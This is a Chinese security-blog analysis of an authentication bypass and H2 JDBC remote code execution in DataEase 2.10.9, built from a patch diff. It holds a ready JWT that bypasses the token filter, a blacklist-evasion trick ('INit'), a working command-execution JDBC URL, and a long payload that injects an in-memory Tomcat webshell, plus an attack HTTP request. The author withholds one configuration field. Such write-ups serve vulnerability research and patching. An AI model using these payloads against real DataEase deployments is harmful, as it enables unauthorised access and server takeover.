# DataEase 权限绕过与远程代码执行漏洞分析-先知社区

> **来源**: https://xz.aliyun.com/news/18283  
> **文章ID**: 18283

---

# 远程调式

本文以kali linux 2024 +docker + win11 + idea进行远程调试。

kali端

```
wget https://github.com/dataease/dataease/releases/download/v2.10.9/dataease-online-installer-v2.10.9-ce.tar.gz
tar -zxvf dataease-online-installer-v2.10.9-ce.tar.gz
cd dataease-online-installer-v2.10.9-ce/
chmod +x install.sh
./install.sh	#等待安装完毕，Ctrl+c
```

![image.png](images/20250623162620-bddbdf1e-500b-1.png)

修改配置文件开启远程调试

`vi /opt/dataease2.0/docker-compose.yml`

修改

`environment: - JAVA_DEBUG=true ports: - ${DE_PORT}:8100 - 5005:5005`

![image.png](images/20250623162621-be082c42-500b-1.png)

启动dataease

`dectl restart`

![image.png](images/20250623162621-be281de8-500b-1.png)

Win端：

下载源码：<https://github.com/dataease/dataease/archive/refs/tags/v2.10.9.zip>

解压到本地中，使用idea打开

![image.png](images/20250623162621-be408c40-500b-1.png)

配置远程jvm调试

![image.png](images/20250623162621-be606dda-500b-1.png)

在`io.dataease.auth.filter.CommunityTokenFilter#doFilter`类中打断点

访问http://x.x.x.x:8100

![image.png](images/20250623162622-be8cea4a-500b-1.png)

# Commint分析

<https://github.com/dataease/dataease/releases>

![image.png](images/20250623162622-beba122c-500b-1.png)

<https://github.com/dataease/dataease/compare/v2.10.9...v2.10.10>

2.10.9与2.10.10对比，这里与安全相关的就框框中的地方

![image.png](images/20250623162622-bee69f0c-500b-1.png)

代码差异对比

![image.png](images/20250623162622-bf17a2b6-500b-1.png)

![image.png](images/20250623162623-bf58e318-500b-1.png)

# 代码分析

## 鉴权绕过

鉴权的代码主要在`io.dataease.auth.filter`下，存在两个filter，直接断点。

`io.dataease.auth.filter.TokenFilter#doFilter`

`io.dataease.auth.filter.CommunityTokenFilter#doFilter`

通过代码commit对比得知，漏洞点在`io.dataease.auth.filter.CommunityTokenFilter#doFilter`中

验证token时，验证不通过后没有在catch中直接退出程序，而是继续走doFilter导致绕过。

![image.png](images/20250623162623-bf7a199e-500b-1.png)

那么如何走完这两个doFilter方法，让程序进入对应请求地址的处理代码中呢？

通过`io.dataease.auth.filter.FilterConfig`可知`TokenFilter`的优先级比`CommunityTokenFilter`高

![image.png](images/20250623162623-bfa90508-500b-1.png)

`io.dataease.auth.filter.TokenFilter#doFilte`

需要存在 X-DE-TOKEN（也就是jwt使用到的请求头），在代码前面的linkToken的处理与后续代码类似，也能进入下一个filter，但有点问题。

![image.png](images/20250623162624-bfcfc468-500b-1.png)

X-DE-TOKEN 的长度要小于100 `io.dataease.utils.TokenUtils#validate`

![image.png](images/20250623162624-bfe6de34-500b-1.png)

jwt中要存在uid值`io.dataease.utils.TokenUtils#userBOByToken`，uid=1即可

![image.png](images/20250623162624-bffcc706-500b-1.png)

校验完上面代码后就进入下一个doFilter中了，也就是

`io.dataease.auth.filter.CommunityTokenFilter#doFilter`

最后构造一下jwt值，我这里直接拿登录接口后端返回的jwt值，解码后如下

`{"typ":"JWT","alg":"HS256"}.{"uid":1,"oid":1,"exp":1750250627}.mpUhKHy1CPfhyb9w-flz9oTIFF52dB2QoXvnmnA0vRs`

直接使用这段jwt也是可以的。

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzUwMjUwNjI3fQ.mpUhKHy1CPfhyb9w-flz9oTIFF52dB2QoXvnmnA0vRs`

![image.png](images/20250623162624-c0291770-500b-1.png)

## H2数据库RCE

登录到后台，使用数据源添加功能，填写利用jdbc url是打不成功的。（前端没H2数据库选择，需要在数据包指定）

![image.png](images/20250623162625-c05b6306-500b-1.png)

报错：`Request processing failed: DEException(code=40001, msg=Cannot invoke \"io.dataease.extensions.datasource.vo.DatasourceConfiguration.isUseSSH()\" because \"configuration\" is null)`

![image.png](images/20250623162625-c08ab6f6-500b-1.png)

这也就是为什么其他大佬的漏洞复现文章对configuration打码的原因，那么是哪里出现的问题？（思来想去既然大佬们都不公布，这里我还是不公布漏洞poc吧，毕竟这是分析文章 [狗头]）

经过断点分析后发现，在代码`io.dataease.datasource.provider.CalciteProvider#getConnection`中有答案。

在利用之前还需要绕过黑名单限制`io.dataease.datasource.type.H2#getJdbc`，黑名单检测传入url是否存在INIT、RUNSCRIPT。

![image.png](images/20250623162625-c0a4b664-500b-1.png)

绕过方式可以使用`Init`或`I\N\I\T`

对应处理代码

`org.h2.engine.ConnectionInfo#readSettingsFromURL`

![image.png](images/20250623162625-c0c897c8-500b-1.png)

`org.h2.util.StringUtils#arraySplit`

![image.png](images/20250623162626-c0ef724c-500b-1.png)

使用如下jdbc url即可命令执行

`jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INit=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('touch /tmp/1')\\;`

![image.png](images/20250623162626-c11c8934-500b-1.png)

![image.png](images/20250623162626-c1423cb8-500b-1.png)

## H2 JDBC 内存马注入

根据文章构造即可

<https://mp.weixin.qq.com/s/PlRwbc5AhJDjPwIZcUv5Rw>

在tomcatStr处填入生成的内存马

`"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INiT=CREATE ALIAS if not exists AQWSSSAZ AS 'void shellexec(String abc) throws java.lang.Exception{byte[] standBytes=null\\;String tomcatStr=\"\"\\;java.lang.Class unsafeClass=java.lang.Class.forName(\"sun.misc.Unsafe\")\\;java.lang.reflect.Field unsafeField=unsafeClass.getDeclaredField(\"theUnsafe\")\\;unsafeField.setAccessible(true)\\;sun.misc.Unsafe unsafe=(sun.misc.Unsafe)unsafeField.get(null)\\;java.lang.Module module=java.lang.Object.class.getModule()\\;java.lang.Class cls=AQWSSSAZ.class\\;long offset=unsafe.objectFieldOffset(java.lang.Class.class.getDeclaredField(\"module\"))\\;unsafe.getAndSetObject(cls,offset,module)\\;java.lang.reflect.Method defineClass=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",byte[].class,java.lang.Integer.TYPE,java.lang.Integer.TYPE)\\;defineClass.setAccessible(true)\\;byte[] bytecode=java.util.Base64.getDecoder().decode(tomcatStr)\\;java.lang.Class clazz=(java.lang.Class)defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length)\\;clazz.newInstance()\\;}'\\;CALL AQWSSSAZ('calc')"`

```
String att4 = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists AQWSSSAZ AS 'void shellexec(String abc) throws java.lang.Exception{byte[] standBytes=null\;String tomcatStr=""\;java.lang.Class unsafeClass=java.lang.Class.forName("sun.misc.Unsafe")\;java.lang.reflect.Field unsafeField=unsafeClass.getDeclaredField("theUnsafe")\;unsafeField.setAccessible(true)\;sun.misc.Unsafe unsafe=(sun.misc.Unsafe)unsafeField.get(null)\;java.lang.Module module=java.lang.Object.class.getModule()\;java.lang.Class cls=AQWSSSAZ.class\;long offset=unsafe.objectFieldOffset(java.lang.Class.class.getDeclaredField("module"))\;unsafe.getAndSetObject(cls,offset,module)\;java.lang.reflect.Method defineClass=java.lang.ClassLoader.class.getDeclaredMethod("defineClass",byte[].class,java.lang.Integer.TYPE,java.lang.Integer.TYPE)\;defineClass.setAccessible(true)\;byte[] bytecode=java.util.Base64.getDecoder().decode(tomcatStr)\;java.lang.Class clazz=(java.lang.Class)defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length)\;clazz.newInstance()\;}'\;CALL AQWSSSAZ('calc')";
```

```
POST /de2api/datasource/getSchema HTTP/1.1
Host: 192.168.1.104:8100
Origin: http://192.168.1.104:8100
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
sec-ch-ua-mobile: ?0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzUwMjUwNjI3fQ.mpUhKHy1CPfhyb9w-flz9oTIFF52dB2QoXvnmnA0vRs
Referer: http://192.168.1.104:8100/
Accept-Language: zh-CN
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
sec-ch-ua-platform: "Windows"
X-Remote-IP: 127.0.0.1
Priority: u=0
X-Forwarded-For: 127.0.0.1
Content-Length: 25989

{
  "id": "",
  "name": "test",
  "description": "rwertw",
  "type": "h2",
  "apiConfiguration": [],
  "paramsConfiguration": [],
  "enableDataFill": false,
  "configuration": "需要你分析哦"
}
```

![131bc7674ad723b68cad1e6b7e57330.png](images/20250623162626-c15aa8f4-500b-1.png)

# 参考

<https://mp.weixin.qq.com/s/PlRwbc5AhJDjPwIZcUv5Rw>

<https://www.cnblogs.com/CoLo/p/17051019.html#h2>

<https://www.yulate.com/post/suctf2025-chu-ti-ji-lu/>

[https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html](https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html#)

<https://github.com/Whoopsunix/JavaRce/blob/main/SecVulns/VulnCore/JDBCAttack/src/main/java/h2database/H2Attack.java>
